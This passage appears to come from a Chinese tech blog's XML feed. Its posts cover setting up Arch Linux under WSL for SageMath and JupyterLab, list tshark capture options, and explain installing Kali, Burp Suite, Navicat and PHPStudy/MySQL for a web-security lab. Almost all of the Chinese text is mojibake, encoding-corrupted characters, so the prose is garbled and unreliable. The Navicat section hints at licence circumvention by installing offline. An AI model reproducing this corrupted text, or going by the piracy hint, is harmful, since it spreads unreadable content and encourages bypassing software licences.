<p>åœ¨ç®¡ç†å‘˜æ¨¡å¼ä¸‹æ‰“å¼€ PowerShell æˆ– Windows å‘½ä»¤æç¤ºç¬¦ï¼Œæ–¹æ³•æ˜¯å³é”®å•å‡»å¹¶é€‰æ‹©â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼Œè¾“å…¥ wsl --install å‘½ä»¤ï¼Œç„¶åé‡å¯è®¡ç®—æœºã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>
<p><em>é»˜è®¤å®‰è£…çš„æ˜¯Ubuntu</em></p>
<p>éœ€è¦æ³¨æ„ï¼šå…³é”®ä¸€æ­¥æ˜¯åœ¨æ§åˆ¶é¢æ¿-å¯ç”¨æˆ–å…³é—­windowsåŠŸèƒ½ä¸­å‹¾é€‰<strong>é€‚ç”¨äºLinuxçš„windowså­ç³»ç»Ÿ</strong></p>
<h2 id="æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„wslç‰ˆæœ¬">æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„wslç‰ˆæœ¬</h2>
<p>å¯åˆ—å‡ºå·²å®‰è£…çš„ Linux å‘è¡Œç‰ˆï¼Œå¹¶é€šè¿‡åœ¨ PowerShell æˆ– Windows å‘½ä»¤æç¤ºç¬¦ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥æ¯ä¸ªå‘è¡Œç‰ˆçš„ WSL ç‰ˆæœ¬ï¼š<code>wsl -l -v</code>ã€‚</p>
<p>æŸ¥çœ‹æ‰€å®‰è£…çš„ <code>Linux</code> ç‰ˆæœ¬ï¼Œä½¿ç”¨å‘½ä»¤ï¼š <code>wsl --list</code> ã€‚</p>
<p>å¦‚æœ‰éœ€è¦ï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤å°†ArchLinuxè®¾ä¸ºé»˜è®¤ç³»ç»Ÿï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wsl --set-default Arch</span><br><span class="line"><span class="comment"># å¦‚æœªä¿®æ”¹æœªé»˜è®¤ç³»ç»Ÿï¼Œåˆ™ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">wsl -d Arch</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®pacman">é…ç½®pacman</h2>
<p>é…ç½®<code>pacman</code>é•œåƒæºï¼Œæ”¹ä¸ºå›½å†…çš„ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<p>åå¢åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Server = https://mirrors.ustc.edu.cn/archlinux/$repo/os/$arch</span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ä¸‹é¢å‘½ä»¤ï¼Œé…ç½®pacman keyï¼š</p>
<p><strong>ATTENTION!</strong><br>
æ­¤å¤„é…ç½®ä¸å½“ä¼šåœ¨åç»­æ›´æ–°ç³»ç»Ÿä¸­ï¼ŒéªŒç­¾å‡ºç°é—®é¢˜ã€‚</p>
<blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/yuk7/ArchWSL/issues/317">https://github.com/yuk7/ArchWSL/issues/317</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">killall gpg-agent</span><br><span class="line"><span class="built_in">rm</span> -rf /etc/pacman.d/gnupg/</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line">pacman-key --populate archlinux</span><br><span class="line">pacman -Sy archlinux-keyring</span><br></pre></td></tr></table></figure>
<p><strong>æ›´æ–°ç³»ç»Ÿï¼š</strong>ï¼ˆéå¸¸å…³é”®ï¼Œä¸æ›´æ–°åç»­å®‰è£… jupyter notebook ä¼šå‡ºé”™ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syu</span><br></pre></td></tr></table></figure>
<p>é…ç½®archlinuxcné•œåƒæºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>
<p>å¢åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£…archlinuxcnçš„keyï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Sy archlinuxcn-keyring</span><br></pre></td></tr></table></figure>
<h2 id="é…ç½®ç”¨æˆ·">é…ç½®ç”¨æˆ·</h2>
<p>æ·»åŠ ç”¨æˆ·åä»¥åŠå¯¹åº”å¯†ç å³å¯ã€‚</p>
<h1>å®‰è£…sage</h1>
<p>ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy sagemath</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å³å¯ã€‚<br>
å®‰è£…å®Œæˆåï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage</span><br></pre></td></tr></table></figure>
<p>æ¥å¯åŠ¨ sage æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚æŸ¥çœ‹å®Œåä½¿ç”¨ exit é€€å‡ºå³å¯ã€‚</p>
<h2 id="å®‰è£…-JupyterLab">å®‰è£… JupyterLab</h2>
<p>ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jupyterlab (æˆ–è€…æ”¹ä¸º jupyter notebook)</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å³å¯</p>
<h2 id="åœ¨-JupyterLab-ä¸­-å¯åŠ¨-Sage">åœ¨ JupyterLab ä¸­ å¯åŠ¨ Sage</h2>
<p>åœ¨ ArchLinux ä¸­ä½¿ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sage -n jupyterlab --no-browser --allow-root</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶å¯ä»¥ä½¿ç”¨è·³è½¬å‡ºæ¥çš„çª—å£é‡Œé¢åŒ…å«çš„<code>token</code>ã€‚</p>
<p>ä½¿ç”¨vscode + jupyter notebook serverçš„å½¢å¼ï¼Œä»è€Œå®ç°<code>sagemath10</code>çš„æœåŠ¡å™¨è°ƒç”¨ã€‚</p>
<p>é€€å‡ºæ—¶ä½¿ç”¨Â <code>ctrl+c</code>Â å³å¯ã€‚</p>
<h1>sageä¸­å®‰è£…ç¬¬ä¸‰æ–¹åº“</h1>
<p>è™½ç„¶ä¸çŸ¥é“åŸç†ï¼Œä½†æ˜¯ä¸»è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ç¬¬ä¸‰æ–¹åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S python-pycryptdome</span><br><span class="line">pacman -S python-gmpy2</span><br><span class="line">pacman -S netcat(ç„¶åé»˜è®¤å®‰è£…å³å¯)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±èƒ½æŠŠå¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“å…ˆå®‰è£…åˆ°<code>sagemath 10</code>ã€‚</p>
<p>å…¶ä»–æœ‰éœ€è¦å†è¯´å§å“ˆå“ˆã€‚</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>sagemath</tag>
        <tag>wsl2</tag>
      </tags>
  </entry>
  <entry>
    <title>Tshark&amp;tcpdump</title>
    <url>/2023/11/06/tshark-tcpdump/</url>
    <content><![CDATA[<blockquote>
<p>reference:</p>
<p><a href="http://linux.51yip.com/search/tshark">tshark linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p>
<p><a href="http://linux.51yip.com/search/tcpdump">tcpdump linux å‘½ä»¤ åœ¨çº¿ä¸­æ–‡æ‰‹å†Œ (51yip.com)</a></p>
</blockquote>
<span id="more"></span><!--toc-->

<p>åœ¨Linuxä¸‹ï¼Œå½“æˆ‘ä»¬éœ€è¦æŠ“å–ç½‘ç»œæ•°æ®åŒ…åˆ†ææ—¶ï¼Œé€šå¸¸æ˜¯ä½¿ç”¨tcpdumpæŠ“å–ç½‘ç»œrawæ•°æ®åŒ…å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä¸‹è½½åˆ°æœ¬åœ°ä½¿ç”¨wiresharkç•Œé¢ç½‘ç»œåˆ†æå·¥å…·è¿›è¡Œç½‘ç»œåŒ…åˆ†æã€‚<br>æœ€è¿‘æ‰å‘ç°ï¼ŒåŸæ¥wiresharkä¹Ÿæä¾›æœ‰Linuxå‘½ä»¤è¡Œå·¥å…·-tsharkã€‚tsharkä¸ä»…æœ‰æŠ“åŒ…çš„åŠŸèƒ½ï¼Œè¿˜å¸¦äº†è§£æå„ç§åè®®çš„èƒ½åŠ›ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥ä¸¤ä¸ªå®ä¾‹æ¥ä»‹ç»tsharkå·¥å…·ã€‚</p>
<p>ä¸»è¦å‚æ•°ï¼š</p>
<ol>
<li>æŠ“åŒ…æ¥å£ç±»</li>
<li>-i è®¾ç½®æŠ“åŒ…çš„ç½‘ç»œæ¥å£ï¼Œä¸è®¾ç½®åˆ™é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªéè‡ªç¯æ¥å£ã€‚</li>
<li>-D åˆ—å‡ºå½“å‰å­˜åœ¨çš„ç½‘ç»œæ¥å£ã€‚åœ¨ä¸äº†è§£OSæ‰€æ§åˆ¶çš„ç½‘ç»œè®¾å¤‡æ—¶ï¼Œä¸€èˆ¬å…ˆç”¨â€œtshark -Dâ€æŸ¥çœ‹ç½‘ç»œæ¥å£çš„ç¼–å·ä»¥ä¾›-iå‚æ•°ä½¿ç”¨ã€‚</li>
<li>-f è®¾å®šæŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼ï¼ˆcapture filter expressionï¼‰ã€‚æŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼çš„å†™æ³•é›·åŒäºtcpdumpï¼Œå¯å‚è€ƒtcpdump man pageçš„æœ‰å…³éƒ¨åˆ†ã€‚</li>
<li>-s è®¾ç½®æ¯ä¸ªæŠ“åŒ…çš„å¤§å°ï¼Œé»˜è®¤ä¸º65535ï¼Œå¤šäºè¿™ä¸ªå¤§å°çš„æ•°æ®å°†ä¸ä¼šè¢«ç¨‹åºè®°å…¥å†…å­˜ã€å†™å…¥æ–‡ä»¶ã€‚ï¼ˆè¿™ä¸ªå‚æ•°ç›¸å½“äºtcpdumpçš„-sï¼Œtcpdumpé»˜è®¤æŠ“åŒ…çš„å¤§å°ä»…ä¸º68ï¼‰</li>
<li>-p è®¾ç½®ç½‘ç»œæ¥å£ä»¥éæ··åˆæ¨¡å¼å·¥ä½œï¼Œå³åªå…³å¿ƒå’Œæœ¬æœºæœ‰å…³çš„æµé‡ã€‚</li>
<li>-B è®¾ç½®å†…æ ¸ç¼“å†²åŒºå¤§å°ï¼Œä»…å¯¹windowsæœ‰æ•ˆã€‚</li>
<li>-y è®¾ç½®æŠ“åŒ…çš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œä¸è®¾ç½®åˆ™é»˜è®¤ä¸º-Læ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªåè®®ï¼Œå±€åŸŸç½‘ä¸€èˆ¬æ˜¯EN10MBç­‰ã€‚</li>
<li>-L åˆ—å‡ºæœ¬æœºæ”¯æŒçš„æ•°æ®é“¾è·¯å±‚åè®®ï¼Œä¾›-yå‚æ•°ä½¿ç”¨ã€‚  </li>
<li>æŠ“åŒ…åœæ­¢æ¡ä»¶</li>
<li>-c æŠ“å–çš„packetæ•°ï¼Œåœ¨å¤„ç†ä¸€å®šæ•°é‡çš„packetåï¼Œåœæ­¢æŠ“å–ï¼Œç¨‹åºé€€å‡ºã€‚</li>
<li>-a è®¾ç½®tsharkæŠ“åŒ…åœæ­¢å‘æ–‡ä»¶ä¹¦å†™çš„æ¡ä»¶ï¼Œäº‹å®ä¸Šæ˜¯tsharkåœ¨æ­£å¸¸å¯åŠ¨ä¹‹ååœæ­¢å·¥ä½œå¹¶è¿”å›çš„æ¡ä»¶ã€‚æ¡ä»¶å†™ä¸ºtest:valueçš„å½¢å¼ï¼Œå¦‚â€œ-a duration:5â€è¡¨ç¤ºtsharkå¯åŠ¨ååœ¨5ç§’å†…æŠ“åŒ…ç„¶ååœæ­¢ï¼›â€œ-a filesize:10â€è¡¨ç¤ºtsharkåœ¨è¾“å‡ºæ–‡ä»¶è¾¾åˆ°10kBååœæ­¢ï¼›â€œ-a files:nâ€è¡¨ç¤ºtsharkåœ¨å†™æ»¡nä¸ªæ–‡ä»¶ååœæ­¢ã€‚ï¼ˆwindowsç‰ˆçš„tshark0.99.3ç”¨å‚æ•°â€œ-a files:nâ€ä¸èµ·ä½œç”¨â€”â€”ä¼šæœ‰æ— æ•°å¤šä¸ªæ–‡ä»¶ç”Ÿæˆã€‚ç”±äº-bå‚æ•°æœ‰è‡ªå·±çš„fileså‚æ•°ï¼Œæ‰€è°“â€œå’Œ-bçš„å…¶å®ƒå‚æ•°ç»“åˆä½¿ç”¨â€æ— ä»è¯´èµ·ã€‚è¿™ä¹Ÿè®¸æ˜¯ä¸€ä¸ªbugï¼Œæˆ–tsharkçš„man pageçš„ä¹¦å†™æœ‰è¯¯ã€‚ï¼‰</li>
<li>æ–‡ä»¶è¾“å‡ºæ§åˆ¶</li>
<li>-b è®¾ç½®ring bufferæ–‡ä»¶å‚æ•°ã€‚ring bufferçš„æ–‡ä»¶åç”±-wå‚æ•°å†³å®šã€‚-bå‚æ•°é‡‡ç”¨test:valueçš„å½¢å¼ä¹¦å†™ã€‚â€œ-b duration:5â€è¡¨ç¤ºæ¯5ç§’å†™ä¸‹ä¸€ä¸ªring bufferæ–‡ä»¶ï¼›â€œ-b filesize:5â€è¡¨ç¤ºæ¯è¾¾åˆ°5kBå†™ä¸‹ä¸€ä¸ªring bufferæ–‡ä»¶ï¼›â€œ-b files:7â€è¡¨ç¤ºring bufferæ–‡ä»¶æœ€å¤š7ä¸ªï¼Œå‘¨è€Œå¤å§‹åœ°ä½¿ç”¨ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸è®¾å®šï¼Œtsharkä¼šå°†ç£ç›˜å†™æ»¡ä¸ºæ­¢ã€‚</li>
<li>æ–‡ä»¶è¾“å…¥</li>
<li>-r è®¾ç½®tsharkåˆ†æçš„è¾“å…¥æ–‡ä»¶ã€‚tsharkæ—¢å¯ä»¥æŠ“å–åˆ†æå³æ—¶çš„ç½‘ç»œæµé‡ï¼Œåˆå¯ä»¥åˆ†ædumpåœ¨æ–‡ä»¶ä¸­çš„æ•°æ®ã€‚-rä¸èƒ½æ˜¯å‘½åç®¡é“å’Œæ ‡å‡†è¾“å…¥ã€‚</li>
<li>å¤„ç†ç±»</li>
<li>-R è®¾ç½®è¯»å–ï¼ˆæ˜¾ç¤ºï¼‰è¿‡æ»¤è¡¨è¾¾å¼ï¼ˆread filter expressionï¼‰ã€‚ä¸ç¬¦åˆæ­¤è¡¨è¾¾å¼çš„æµé‡åŒæ ·ä¸ä¼šè¢«å†™å…¥æ–‡ä»¶ã€‚æ³¨æ„ï¼Œè¯»å–ï¼ˆæ˜¾ç¤ºï¼‰è¿‡æ»¤è¡¨è¾¾å¼çš„è¯­æ³•å’Œåº•å±‚ç›¸å…³çš„æŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼è¯­æ³•ä¸ç›¸åŒï¼Œå®ƒçš„è¯­æ³•è¡¨è¾¾è¦ä¸°å¯Œå¾—å¤šï¼Œè¯·å‚è€ƒ<a href="http://www.ethereal.com/docs/dfref/%E5%92%8Chttp://www.ethereal.com/docs/man-pages/ethereal-filter.4.html%E3%80%82%E7%B1%BB%E4%BC%BC%E4%BA%8E%E6%8A%93%E5%8C%85%E8%BF%87%E6%BB%A4%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%8C%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8%E6%97%B6%E6%9C%80%E5%A5%BD%E5%B0%86%E5%AE%83%E4%BB%ACquote%E8%B5%B7%E6%9D%A5%E3%80%82">http://www.ethereal.com/docs/dfref/å’Œhttp://www.ethereal.com/docs/man-pages/ethereal-filter.4.htmlã€‚ç±»ä¼¼äºæŠ“åŒ…è¿‡æ»¤è¡¨è¾¾å¼ï¼Œåœ¨å‘½ä»¤è¡Œä½¿ç”¨æ—¶æœ€å¥½å°†å®ƒä»¬quoteèµ·æ¥ã€‚</a></li>
<li>-n ç¦æ­¢æ‰€æœ‰åœ°å€åå­—è§£æï¼ˆé»˜è®¤ä¸ºå…è®¸æ‰€æœ‰ï¼‰ã€‚</li>
<li>-N å¯ç”¨æŸä¸€å±‚çš„åœ°å€åå­—è§£æã€‚â€œmâ€ä»£è¡¨MACå±‚ï¼Œâ€œnâ€ä»£è¡¨ç½‘ç»œå±‚ï¼Œâ€œtâ€ä»£è¡¨ä¼ è¾“å±‚ï¼Œâ€œCâ€ä»£è¡¨å½“å‰å¼‚æ­¥DNSæŸ¥æ‰¾ã€‚å¦‚æœ-nå’Œ-Nå‚æ•°åŒæ—¶å­˜åœ¨ï¼Œ-nå°†è¢«å¿½ç•¥ã€‚å¦‚æœ-nå’Œ-Nå‚æ•°éƒ½ä¸å†™ï¼Œåˆ™é»˜è®¤æ‰“å¼€æ‰€æœ‰åœ°å€åå­—è§£æã€‚</li>
<li>-d å°†æŒ‡å®šçš„æ•°æ®æŒ‰æœ‰å…³åè®®è§£åŒ…è¾“å‡ºã€‚å¦‚è¦å°†tcp 8888ç«¯å£çš„æµé‡æŒ‰httpè§£åŒ…ï¼Œåº”è¯¥å†™ä¸ºâ€œ-d tcp.port&#x3D;&#x3D;8888,httpâ€ã€‚æ³¨æ„é€‰æ‹©å­å’Œè§£åŒ…åè®®ä¹‹é—´ä¸èƒ½ç•™ç©ºæ ¼ã€‚</li>
<li>è¾“å‡ºç±»</li>
<li>-w è®¾ç½®rawæ•°æ®çš„è¾“å‡ºæ–‡ä»¶ã€‚è¿™ä¸ªå‚æ•°ä¸è®¾ç½®ï¼Œtsharkå°†ä¼šæŠŠè§£ç ç»“æœè¾“å‡ºåˆ°stdoutã€‚â€œ-w-â€è¡¨ç¤ºæŠŠrawè¾“å‡ºåˆ°stdoutã€‚å¦‚æœè¦æŠŠè§£ç ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œä½¿ç”¨é‡å®šå‘â€œ&gt;â€è€Œä¸è¦-wå‚æ•°ã€‚</li>
<li>-F è®¾ç½®è¾“å‡ºrawæ•°æ®çš„æ ¼å¼ï¼Œé»˜è®¤ä¸ºlibpcapã€‚â€œtshark -Fâ€ä¼šåˆ—å‡ºæ‰€æœ‰æ”¯æŒçš„rawæ ¼å¼ã€‚</li>
<li>-V è®¾ç½®å°†è§£ç ç»“æœçš„ç»†èŠ‚è¾“å‡ºï¼Œå¦åˆ™è§£ç ç»“æœä»…æ˜¾ç¤ºä¸€ä¸ªpacketä¸€è¡Œçš„summaryã€‚</li>
<li>-x è®¾ç½®åœ¨è§£ç è¾“å‡ºç»“æœä¸­ï¼Œæ¯ä¸ªpacketåé¢ä»¥HEX dumpçš„æ–¹å¼æ˜¾ç¤ºå…·ä½“æ•°æ®ã€‚</li>
<li>-T è®¾ç½®è§£ç ç»“æœè¾“å‡ºçš„æ ¼å¼ï¼ŒåŒ…æ‹¬text,ps,psmlå’Œpdmlï¼Œé»˜è®¤ä¸ºtextã€‚</li>
<li>-t è®¾ç½®è§£ç ç»“æœçš„æ—¶é—´æ ¼å¼ã€‚â€œadâ€è¡¨ç¤ºå¸¦æ—¥æœŸçš„ç»å¯¹æ—¶é—´ï¼Œâ€œaâ€è¡¨ç¤ºä¸å¸¦æ—¥æœŸçš„ç»å¯¹æ—¶é—´ï¼Œâ€œrâ€è¡¨ç¤ºä»ç¬¬ä¸€ä¸ªåŒ…åˆ°ç°åœ¨çš„ç›¸å¯¹æ—¶é—´ï¼Œâ€œdâ€è¡¨ç¤ºä¸¤ä¸ªç›¸é‚»åŒ…ä¹‹é—´çš„å¢é‡æ—¶é—´ï¼ˆdeltaï¼‰ã€‚</li>
<li>-S åœ¨å‘rawæ–‡ä»¶è¾“å‡ºçš„åŒæ—¶ï¼Œå°†è§£ç ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ã€‚</li>
<li>-l åœ¨å¤„ç†æ¯ä¸ªåŒ…æ—¶å³æ—¶åˆ·æ–°è¾“å‡ºã€‚</li>
<li>-X æ‰©å±•é¡¹ã€‚</li>
<li>-q è®¾ç½®å®‰é™çš„stdoutè¾“å‡ºï¼ˆä¾‹å¦‚åšç»Ÿè®¡æ—¶ï¼‰</li>
<li>-z è®¾ç½®ç»Ÿè®¡å‚æ•°ã€‚</li>
<li>å…¶å®ƒ</li>
<li>-h æ˜¾ç¤ºå‘½ä»¤è¡Œå¸®åŠ©ã€‚</li>
<li>-v æ˜¾ç¤ºtsharkçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li>
<li>-o é‡è½½é€‰é¡¹ã€‚</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Web-Commontools-Install</title>
    <url>/2024/12/02/web-commontools-install/</url>
    <content><![CDATA[<p>æœ¬æ–‡ç« ä¸»è¦ç®€å•ä»‹ç»äº†webç¯å¢ƒä¸€äº›å¸¸è§å·¥å…·çš„ä¸‹è½½ä»¥åŠå®‰è£…ï¼Œä»¥åŠä¸€äº›ç®€å•é¶åœºç¯å¢ƒçš„æ­å»ºã€‚</p>
<span id="more"></span><!--toc-->
<h1>å®‰è£…VMware</h1>
<blockquote>
<p><a href="https://www.vmware.com/">VMware by Broadcom - Cloud Computing for the Enterprise</a></p>
</blockquote>
<ul>
<li>å®‰è£…VMware WorkStation Pro</li>
<li>å®‰è£…è™šæ‹Ÿç¯å¢ƒä¾¿äºå¤šå¹³å°é›†æˆä½¿ç”¨</li>
</ul>
<h1>å®‰è£…kali</h1>
<blockquote>
<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p>
</blockquote>
<img src="/2024/12/02/web-commontools-install/image-20241202183622627.png" class="" title="image-20241202183622627">
<p>ä¸‹è½½ä¸‹æ¥çš„å‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹ç¼©ï¼Œä½¿ç”¨VMwareæ‰“å¼€å¯¹åº”æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œå³å¯ç›´æ¥å¯¼å…¥kaliè™šæ‹Ÿç¯å¢ƒã€‚</p>
<p>é»˜è®¤ç”¨æˆ·åï¼škali</p>
<p>é»˜è®¤å¯†ç ï¼škali</p>
<h1>å®‰è£…Java</h1>
<blockquote>
<p><a href="https://blog.csdn.net/JasonXu94/article/details/143726390">Java8ï¼ˆJDK1.8ï¼‰æœ€æ–°ä¸‹è½½å®‰è£…æ•™ç¨‹ï¼Œé™„è¯¦ç»†å›¾æ–‡ï¼Œé€‚åˆæ–°æ‰‹ï¼Œå»ºè®®æ”¶è—_java 1.8ä¸‹è½½-CSDNåšå®¢</a></p>
</blockquote>
<ul>
<li>ä¸»è¦éœ€è¦é…ç½®<strong>ç¯å¢ƒå˜é‡</strong>
<ul>
<li>Path</li>
<li>åˆ›å»ºJAVA_HOMEï¼Œjdkçš„å®‰è£…è·¯å¾„</li>
</ul>
</li>
<li>æ§åˆ¶é¢æ¿-ç³»ç»Ÿ-é«˜çº§å±æ€§è®¾ç½®</li>
<li>æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ
<ul>
<li>è¿è¡Œ<code>java -version</code></li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202183547943.png" class="" title="image-20241202183547943">
<h1>å®‰è£…burpsuite</h1>
<h2 id="kali">kali</h2>
<p>kaliè‡ªå¸¦burpsuiteï¼Œä¸€èˆ¬ç›´æ¥è°ƒç”¨å·¥å…·åº“å³å¯ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202190344263.png" class="" title="image-20241202190344263">
<img src="/2024/12/02/web-commontools-install/image-20241202211219462.png" class="" title="image-20241202211219462">
<ul>
<li>
<p>åˆ©ç”¨<strong>burpsuiteè‡ªå¸¦çš„æµè§ˆå™¨</strong>ï¼Œä¸éœ€è¦é¢å¤–é…ç½®å°±å¯ä»¥å®ç°æŠ“åŒ…</p>
</li>
<li>
<p>éƒ¨åˆ†æ— æ³•è¿›è¡ŒæŠ“åŒ…ï¼Œå¯å‚è€ƒ<strong>æœ¬åœ°ç¯å¢ƒè¿›è¡Œé…ç½®</strong>å®ç°æŠ“åŒ…</p>
</li>
</ul>
<h2 id="æœ¬åœ°ç¯å¢ƒ">æœ¬åœ°ç¯å¢ƒ</h2>
<blockquote>
<p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter1.html">ç¬¬ä¸€ç«  Burp Suite å®‰è£…å’Œç¯å¢ƒé…ç½® Â· burpsuiteå®æˆ˜æŒ‡å—</a></p>
</blockquote>
<ul>
<li>æ¨èä½¿ç”¨firefoxæµè§ˆå™¨</li>
<li>å®‰è£…æ’ä»¶-FoxyProxy</li>
<li>Option-Proxyï¼Œè¿›è¡Œä»£ç†é…ç½®ï¼Œ<code>127.0.0.1:8080</code></li>
<li>è®¿é—®ï¼š<code>http://burp</code>è¿›è¡Œæµ‹è¯•
<ul>
<li>Intercept-off</li>
<li>æ’ä»¶ä»£ç†-on</li>
</ul>
</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212152785.png" class="" title="image-20241202212152785">
<h1>å®‰è£…Navicat</h1>
<blockquote>
<p><a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021">https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA4MjU4MTg2Ng==&amp;action=getalbum&amp;album_id=3421653652102742021</a></p>
</blockquote>
<ul>
<li>ä¸€å®šè®°å¾—æ–­ç½‘è¿›è¡Œå®ç°</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202212358986.png" class="" title="image-20241202212358986">
<h1>å®‰è£…PHP study+MySQL</h1>
<h2 id="é…ç½®MySQLç¯å¢ƒ">é…ç½®MySQLç¯å¢ƒ</h2>
<img src="/2024/12/02/web-commontools-install/image-20241202213657613.png" class="" title="image-20241202213657613">
<p>è¿›å…¥å‘½ä»¤è¡Œï¼Œä½¿ç”¨<code>mysql --version</code>å‘ç°æ²¡æˆåŠŸã€‚</p>
<p>æ‰“å¼€<code>ç½‘ç«™</code>ï¼Œè¿›å…¥æ ¹ç›®å½•ï¼Œè¿›å…¥<code>Extensions</code>ï¼ŒæŠŠ<code>MySQL</code>å¯¹åº”çš„ç›®å½•è¿›è¡Œå¤åˆ¶ã€‚</p>
<p>é…ç½®ç¯å¢ƒå˜é‡ï¼ŒæŠŠå¤åˆ¶çš„å˜é‡æ”¾åœ¨ç³»ç»Ÿå˜é‡ä¸­ã€‚</p>
<p>é»˜è®¤ç”¨æˆ·åä»¥åŠå¯†ç ä¸º<code>root</code>ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202214431254.png" class="" title="image-20241202214431254">
<p>å‘½ä»¤è¡Œç™»å½•ï¼š<code>mysql -u [username] -p</code>ï¼Œå›è½¦ä¹‹åå¡«å…¥mysqlå¯¹åº”çš„å¯†ç ã€‚</p>
<h2 id="é…ç½®Navicat-å¯¼å…¥sqlæ–‡ä»¶">é…ç½®Navicat+å¯¼å…¥sqlæ–‡ä»¶</h2>
<blockquote>
<p><a href="https://blog.csdn.net/tkf021004/article/details/136098343">ã€MySQLã€‘å¦‚ä½•è¿è¡Œsqlæ–‡ä»¶ï¼ˆä»¥Navicatåšæ¼”ç¤ºï¼‰_navicatè¿è¡Œsqlæ–‡ä»¶-CSDNåšå®¢</a></p>
</blockquote>
<p>åœ¨ä¸Šé¢æˆåŠŸçš„åŸºç¡€ä¸Šï¼Œæ–°å»ºè¿æ¥ï¼Œè¾“å…¥å¯¹åº”çš„ç”¨æˆ·åä»¥åŠå¯†ç ã€‚</p>
<p>æµ‹è¯•è¿æ¥ï¼Œè¿æ¥æˆåŠŸä¹‹åå³å¯å»ºç«‹è¿æ¥ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215004143.png" class="" title="image-20241202215004143">
<p><strong>å­—ç¬¦é›†ï¼š</strong><br>
å¦‚æœä½ çš„æ•°æ®åº“ç‰ˆæœ¬ä¸º5.x :é€‰æ‹©utf8<br>
å¦‚æœä½ çš„æ•°æ®åº“ç‰ˆæœ¬ä¸º8.0 :é€‰æ‹©utf8mb4</p>
<img src="/2024/12/02/web-commontools-install/image-20241202215157884.png" class="" title="image-20241202215157884">
